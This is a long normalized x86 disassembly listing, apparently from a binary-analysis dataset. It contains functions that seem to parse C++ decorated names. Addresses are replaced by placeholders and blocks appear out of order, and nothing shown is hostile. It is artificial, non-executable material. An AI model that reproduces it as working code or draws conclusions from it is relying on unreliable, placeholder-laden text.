je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x54 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x30 ] eax
test eax eax
je r-xdata
mov eax [ rw-data ]
shr eax 0x13
not eax
test al 0x1
lea eax [ ebp - 0x64 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x200
je r-xdata
push r--data
lea ecx [ ebp - 0x34 ]
call sub_410fcd
mov eax ebx
and eax 0x700
cmp eax 0x600
jne r-xdata
mov eax ebx
test edi edi
je r-xdata
test edi edi
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
jmp r-xdata
test ecx ecx
je r-xdata
mov eax ebx
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
mov ecx 0x800
and eax esi
mov edx 0x6000
sub eax ecx
jmp r-xdata
call sub_4148d5
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_4110b8
call sub_4148d5
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
jmp r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
test ecx ecx
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x1c ]
push 0x2c
mov [ ebp - 0x48 ] eax
call sub_410f18
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x54 ]
push eax
call sub_410ed5
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x1c ]
push 0x2c
mov [ ebp - 0x50 ] eax
call sub_410f18
mov eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0x50 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x3c ]
push eax
call sub_410ed5
jmp r-xdata
and eax 0x6000
and eax esi
sub eax edx
jmp r-xdata
mov ecx ebx
and ecx esi
sub ecx 0x1000
neg ecx
sbb ecx ecx
inc ecx
mov eax ebx
xor ecx ecx
and al 0xc0
cmp al 0x80
sete cl
jmp r-xdata
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov ecx [ ebp - 0x54 ]
mov edx [ ebp - 0x50 ]
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] edx
jmp r-xdata
and eax edx
and eax esi
sub eax ecx
jmp r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
mov eax ebx
je r-xdata
call sub_41590a
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_4110b8
call sub_41590a
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
jmp r-xdata
mov eax [ rw-data ]
shr eax 0x8
not eax
test al 0x1
lea eax [ ebp - 0x64 ]
push eax
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
jne r-xdata
mov eax [ ebp - 0x4c ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x48 ]
push 0x2c
mov [ ebp - 0x50 ] eax
call sub_410f18
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
jmp r-xdata
test edi edi
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
test ecx ecx
je r-xdata
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x500
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x64 ]
push eax
call sub_413408
pop ecx
push eax
lea ecx [ ebp - 0x34 ]
call sub_4110b8
mov eax [ rw-data ]
shr eax 0x2
not eax
test al 0x1
je r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x24 ]
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x28 ]
push r--data
mov [ ebp - 0x50 ] eax
call sub_410fcd
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_410ed5
mov eax ebx
and eax esi
neg eax
sbb eax eax
inc eax
push 0x0
test bl 0xc0
pop eax
sete al
jmp r-xdata
and eax edx
and eax esi
sub eax ecx
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ ecx ] eax
mov eax [ ebp - 0x30 ]
mov [ ecx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x34 ] esi
jmp r-xdata
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x54 ]
push eax
push r--data
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
test edi edi
je r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x600
je r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
mov [ ebp - 0x30 ] eax
and eax edx
and eax esi
sub eax ecx
jmp r-xdata
mov eax ebx
and eax 0x700
cmp eax 0x400
jne r-xdata
neg eax
sbb eax eax
inc eax
test eax eax
je r-xdata
sub_411f34
push ebp
mov ebp esp
push esi
mov esi ecx
push edi
xor edi edi
cmp [ esi ] edi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
mov [ esi + 0x4 ] 0x3
mov [ esi ] edi
jmp r-xdata
mov [ esi + 0x4 ] 0x2
cmp [ ebp + 0xc ] edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
sub eax edi
je r-xdata
mov [ esi + 0x4 ] 0x3
jmp r-xdata
mov ecx rw-data
push edi
sub eax 0x1
je r-xdata
pop ebx
push 0x8
call sub_413d8f
test eax eax
je r-xdata
push 0xc
call sub_413d8f
test eax eax
je r-xdata
mov eax edi
mov cl [ ebx ]
mov [ eax ] r--data
mov [ eax + 0x4 ] cl
jmp r-xdata
mov [ esi ] edi
test edi edi
jmp r-xdata
push [ ebp + 0xc ]
mov ecx eax
push ebx
call sub_410aa8
mov edi eax
mov [ esi ] eax
test eax eax
jne r-xdata
sub_412010
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
inc ebx
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
and [ esi + 0x4 ] 0xffff00ff
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
push edi
pop edi
cmp cl 0x5a
je r-xdata
test ebx ebx
je r-xdata
push 0x2c
mov ecx esi
call sub_410f18
mov eax [ rw-data ]
xor ebx ebx
jmp r-xdata
push 0x1
mov ecx esi
call sub_41102e
movsx ecx cl
sub ecx 0x30
cmp ecx 0x9
ja r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
and [ ebp - 0x8 ] 0x0
mov edi eax
and [ ebp - 0x4 ] 0xffff0000
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4144e0
mov eax [ rw-data ]
sub eax edi
pop ecx
pop ecx
cmp eax 0x1
jle r-xdata
inc eax
mov [ rw-data ] eax
lea eax [ ebp - 0x18 ]
push ecx
mov ecx [ rw-data ]
push eax
call sub_410c08
push eax
mov ecx esi
call sub_410ed5
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov ecx esi
push eax
call sub_410ed5
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
mov ecx [ rw-data ]
cmp [ ecx ] 0x9
je r-xdata
mov eax [ rw-data ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0xffff00ff
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x2
lea eax [ ebp - 0x10 ]
push eax
call sub_41106e
mov cl [ eax ]
cmp cl 0x40
je r-xdata
jmp r-xdata
sub_41211c
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x10
movsx ecx [ eax ]
sub ecx 0x58
je r-xdata
inc eax
mov [ rw-data ] eax
push r--data
dec ecx
sub ecx 0x1
je r-xdata
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_412010
mov edx [ ebp - 0x4 ]
pop ecx
test dl dl
jne r-xdata
push eax
jmp r-xdata
mov eax r--data
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_410823
mov esp ebp
pop ebp
retn
cmp cl 0x40
je r-xdata
inc eax
mov [ rw-data ] eax
cmp cl 0x5a
je r-xdata
inc eax
mov [ rw-data ] eax
mov eax [ rw-data ]
shr eax 0x12
not eax
test al 0x1
mov eax r--data
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
jmp r-xdata
push eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410e91
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edx ] ecx
mov ecx [ eax + 0x4 ]
mov eax edx
mov [ edx + 0x4 ] ecx
jmp r-xdata
mov eax r--data
mov eax [ ebp + 0x8 ]
sub_4121fc
push ebp
mov ebp esp
mov eax [ rw-data ]
sub esp 0x30
cmp [ eax ] 0x0
push esi
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
call sub_413e1d
mov esi eax
test esi esi
jns r-xdata
lea eax [ ebp - 0x30 ]
push 0x5d
push eax
lea eax [ ebp - 0x28 ]
lea ecx [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
push 0x28
lea ecx [ ebp - 0x30 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
push r--data
mov [ ebp - 0x14 ] eax
call sub_410fcd
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
push 0x1
mov [ ebp - 0xc ] eax
call sub_41102e
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push 0x5d
mov [ ebp - 0x4 ] eax
call sub_410f18
lea eax [ ebp - 0x8 ]
jmp r-xdata
jne r-xdata
xor esi esi
test esi esi
push eax
push [ ebp + 0x8 ]
call sub_412497
mov eax [ ebp + 0x8 ]
pop ecx
pop ecx
mov eax [ ebp - 0x4 ]
and [ ebp - 0x8 ] 0x0
and eax 0xffff0000
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
test [ edi + 0x4 ] 0x800
je r-xdata
lea eax [ ebp - 0x20 ]
push 0x5d
push eax
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
jmp r-xdata
cmp al 0x1
jg r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410fcd
mov eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x5b
call sub_4107aa
mov ecx eax
call sub_410eb3
mov ecx eax
call sub_410e4d
cmp [ edi ] 0x0
je r-xdata
mov eax esi
dec esi
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_4144e0
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
pop ecx
pop ecx
mov ecx [ ebp - 0x20 ]
or edx 0x800
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop edi
jmp r-xdata
test [ edi + 0x4 ] 0x800
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0x28
lea ecx [ ebp - 0x30 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
push 0x29
mov [ ebp - 0xc ] eax
call sub_410f18
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_410ed5
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov ecx edi
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_410e2b
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x28 ]
push 0x0
push eax
call sub_4132d1
pop ecx
pop ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0x5b
lea ecx [ ebp - 0x30 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x10 ]
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
push 0x5d
mov [ ebp - 0x14 ] eax
call sub_410f18
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ed5
cmp [ ebp - 0x4 ] 0x1
jle r-xdata
mov [ ebp - 0x4 ] eax
sub_4123fe
push ebp
mov ebp esp
sub esp 0x10
push 0x0
call sub_41112a
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410823
mov ecx [ rw-data ]
mov al [ ecx ]
test al al
je r-xdata
push 0x1
lea ecx [ ebp - 0x8 ]
call sub_41102e
movsx eax al
inc ecx
mov [ rw-data ] ecx
sub eax 0x30
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410fcd
jmp r-xdata
dec eax
sub eax 0x1
je r-xdata
push r--data
lea ecx [ ebp - 0x8 ]
call sub_410fcd
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
lea eax [ ebp - 0x10 ]
push eax
call sub_414dd4
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ed5
jmp r-xdata
sub eax 0x3
jne r-xdata
mov ecx [ ebp + 0x8 ]
push 0x2
call sub_41085d
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_412497
push ebp
mov ebp esp
mov ecx [ rw-data ]
sub esp 0x1c
mov al [ ecx ]
push ebx
push esi
push edi
test al al
je r-xdata
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_410e07
add esp 0xc
and [ ebp - 0xc ] 0x0
mov edi 0xffff0000
and [ ebp - 0x8 ] edi
inc ecx
movzx esi al
or ebx 0xffffffff
push 0x4e
mov eax esi
mov [ rw-data ] ecx
pop edx
mov [ ebp - 0x1 ] 0x0
cmp eax edx
jg r-xdata
cmp eax 0x4f
je r-xdata
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_410ba1
jle r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_410fcd
sub eax 0x43
cmp eax 0xa
ja r-xdata
mov ecx [ ebp + 0xc ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] edi
mov eax [ ecx ]
mov [ ebp - 0x1c ] eax
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp ebx 0xfffffffe
jne r-xdata
mov bl [ ebp - 0x1 ]
lea eax [ ebp - 0x1c ]
dec ecx
push eax
mov [ rw-data ] ecx
call sub_413477
pop ecx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
test ecx ecx
jne r-xdata
cmp eax 0x53
jle r-xdata
movzx eax [ eax + lookup_table_412877 ]
jmp [ eax * 4 + jump_table_41285f ]
cmp [ ecx ] 0x0
jne r-xdata
mov esi 0x800
or eax esi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push r--data
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_4147bd
mov edx [ ebp - 0x10 ]
add esp 0x10
test esi edx
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
push 0x2
pop ecx
sub esi ecx
je r-xdata
jmp r-xdata
mov ebx esi
and ebx 0x3
jmp r-xdata
cmp eax 0x58
je r-xdata
push r--data
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0x8 ]
call sub_4147bd
add esp 0x10
jmp r-xdata
test bl 0x1
je r-xdata
mov ecx [ ebp - 0x14 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x14 ]
call sub_410fcd
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
push eax
lea eax [ ebp - 0x1c ]
push eax
push 0x20
lea ecx [ ebp - 0x14 ]
call sub_4107aa
mov ecx eax
call sub_410e2b
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0xc ]
call sub_410ed5
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push r--data
jmp r-xdata
sub esi ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
jmp r-xdata
cmp ebx 0xffffffff
jne r-xdata
push r--data
jmp r-xdata
cmp eax 0x5f
jne r-xdata
lea ecx [ ebp - 0xc ]
call sub_410ba1
jmp r-xdata
mov eax [ ebp + 0x8 ]
test bl 0x2
je r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_410ba1
test bl 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x14 ]
call sub_410823
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
sub esi ecx
je r-xdata
mov bl [ ecx ]
inc ecx
movzx eax bl
mov [ rw-data ] ecx
cmp eax edx
jg r-xdata
push r--data
lea ecx [ ebp - 0xc ]
call sub_410ba1
push r--data
lea ecx [ ebp - 0xc ]
call sub_410fcd
jmp r-xdata
sub esi ecx
je r-xdata
cmp eax 0x4f
je r-xdata
je r-xdata
sub esi 0x14
jne r-xdata
push 0xfffffffe
pop ebx
cmp eax 0x52
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x47
jg r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
movzx eax bl
sub eax 0x45
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x53
je r-xdata
lea ecx [ ebp - 0xc ]
call sub_410ba1
jmp r-xdata
cmp eax 0x49
jle r-xdata
cmp eax 0x46
jge r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x55
je r-xdata
sub esi 0x43
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x4b
jle r-xdata
push r--data
jmp r-xdata
test eax eax
je r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x57
je r-xdata
push r--data
jmp r-xdata
cmp eax 0x4d
jg r-xdata
dec ecx
mov [ rw-data ] ecx
lea ecx [ ebp - 0xc ]
push 0x1
call sub_410bd3
jmp r-xdata
cmp eax 0x24
je r-xdata
sub eax ecx
je r-xdata
push r--data
jmp r-xdata
add eax 0xffffffa8
cmp eax 0x1
ja r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push [ ebp + 0xc ]
lea eax [ ebp - 0x1c ]
push eax
call sub_412497
push eax
push r--data
push [ ebp + 0x8 ]
call sub_410de3
add esp 0x14
jmp r-xdata
add eax 0xffffffbc
cmp eax 0x1
ja r-xdata
sub eax ecx
jne r-xdata
lea eax [ ebp - 0x1c ]
dec ecx
push eax
mov [ rw-data ] ecx
call sub_413477
pop ecx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
test ecx ecx
jne r-xdata
push r--data
sub_412896
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
mov cl [ eax ]
test cl cl
je r-xdata
push 0x1
movsx ecx cl
sub ecx 0x41
inc eax
mov [ rw-data ] eax
push 0x2
cmp ecx 0x10
ja r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
mov eax [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
and [ ebp - 0x8 ] 0x0
and eax 0xffff0002
pop edx
or eax edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
and ecx 0xfffffffe
cmp ecx 0x8
ja r-xdata
mov esp ebp
pop ebp
retn
sub ecx 0xc
je r-xdata
je r-xdata
push 0x7
sub ecx edx
je r-xdata
push 0x5
jmp r-xdata
sub ecx 0x0
je r-xdata
push 0x8
jmp r-xdata
sub ecx edx
jne r-xdata
call sub_41112a
pop ecx
push eax
lea ecx [ ebp - 0x8 ]
call sub_410ba1
push 0x1
jmp r-xdata
sub ecx edx
je r-xdata
push 0x6
jmp r-xdata
push edx
jmp r-xdata
sub ecx edx
je r-xdata
push 0x4
jmp r-xdata
sub ecx edx
jne r-xdata
push 0x3
jmp r-xdata
sub_412955
push ebp
mov ebp esp
sub esp 0x54
mov eax [ ebp - 0x38 ]
xor ecx ecx
and eax 0xffff0000
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov al [ eax ]
test al al
je r-xdata
cmp [ ebp + 0x18 ] ecx
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp al 0x24
jne r-xdata
push 0x1
mov esi [ ebp + 0xc ]
cmp [ esi ] ecx
je r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov edx [ ebp - 0x18 ]
mov al [ eax ]
cmp al 0x41
movsx ebx al
mov eax 0xffff0000
setl cl
and [ ebp - 0x20 ] eax
dec ecx
xor edi edi
and ecx 0x2b
mov [ ebp - 0x1c ] edi
add ecx 0x16
and edx eax
sub ebx ecx
mov [ ebp - 0x18 ] edx
xor ecx ecx
xor al al
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x2 ] al
mov [ ebp - 0x3 ] al
push esi
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call sub_413691
mov ecx [ ebp - 0x34 ]
add esp 0x10
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
cmp [ eax ] ecx
je r-xdata
test [ esi + 0x4 ] 0x100
jne r-xdata
mov eax [ rw-data ]
mov ecx eax
shr ecx 0x11
shr eax 0x1
not ecx
not eax
and ecx eax
test cl 0x1
je r-xdata
sub eax 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x30 ]
push eax
jmp r-xdata
push esi
mov eax [ ebp + 0x14 ]
cmp [ eax ] ecx
je r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
cmp [ eax ] 0x24
jne r-xdata
test edi edi
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
sub eax 0x1
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push [ ebp + 0x8 ]
call sub_410e07
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_41085d
mov ecx eax
call sub_410e2b
mov eax [ ebp - 0x3c ]
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x38 ]
push 0x20
mov [ ebp - 0x30 ] eax
call sub_410f18
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x34 ]
call sub_410e2b
jmp r-xdata
mov eax [ rw-data ]
xor ecx ecx
mov edx [ ebp - 0x18 ]
mov al [ eax ]
cmp al 0x41
movsx ebx al
setl cl
dec ecx
and ecx 0x2b
add ecx 0x16
sub ebx ecx
mov ecx [ ebp - 0x24 ]
jmp r-xdata
push esi
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_413691
mov ecx [ ebp - 0x3c ]
add esp 0x10
test ecx ecx
jne r-xdata
push 0x9
push 0x20
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edx
call sub_410f18
push 0x9
call sub_41112a
pop ecx
push eax
lea eax [ ebp - 0x54 ]
lea ecx [ ebp - 0x34 ]
test ecx ecx
je r-xdata
test esi esi
je r-xdata
sub eax 0x1
je r-xdata
mov eax ebx
sub eax 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp - 0x38 ]
jmp r-xdata
push 0xb
call sub_41112a
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call sub_410ba1
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x14 ]
push 0x20
mov [ ebp - 0x10 ] eax
call sub_410f18
push 0xb
call sub_41112a
pop ecx
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x14 ]
call sub_410e91
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] eax
jmp r-xdata
push 0x2
jmp r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
test esi esi
je r-xdata
sub eax 0x1
jne r-xdata
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41085d
mov [ ebp - 0x3 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ rw-data ]
shr eax 0x1
not eax
test al 0x1
je r-xdata
cmp ebx 0x1f
ja r-xdata
inc [ rw-data ]
test edi edi
je r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_410823
mov eax [ ebp - 0x8 ]
lea ecx [ ebp - 0x2c ]
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x14 ]
push eax
call sub_410ed5
mov eax [ ebp - 0x2c ]
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
test edi edi
je r-xdata
push 0xa
jmp r-xdata
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x28 ] edx
call sub_410f18
push 0xa
call sub_41112a
pop ecx
push eax
lea eax [ ebp - 0x44 ]
lea ecx [ ebp - 0x2c ]
jmp r-xdata
mov ecx [ ebp - 0x24 ]
test ecx ecx
je r-xdata
push 0x20
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
call sub_410f18
mov eax [ ebp - 0x2c ]
lea ecx [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x1c ]
push eax
call sub_410ed5
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
call sub_41112a
pop ecx
push eax
lea ecx [ ebp - 0x1c ]
call sub_410ba1
mov edi [ ebp - 0x1c ]
push eax
call sub_410e91
mov edi [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] eax
jmp r-xdata
test bl 0x10
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x2c ] ecx
